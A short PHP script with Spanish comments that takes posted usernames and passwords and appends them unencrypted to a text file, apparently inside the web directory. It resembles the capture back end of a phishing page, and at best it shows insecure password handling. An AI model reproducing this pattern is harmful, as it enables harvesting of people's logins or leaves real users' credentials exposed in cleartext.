<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Datos a guardar
    $datos = "Nombre de usuario: $usuario\nContraseña: $contraseña\n";

    // Ruta al archivo de texto
    $archivo = 'datos_usuarios.txt';

    // Abre el archivo para escritura
    $gestor = fopen($archivo, 'a');

    // Escribe los datos en el archivo
    fwrite($gestor, $datos);

    // Cierra el archivo
    fclose($gestor);

    echo 'Los datos se han guardado correctamente.';
}
?>
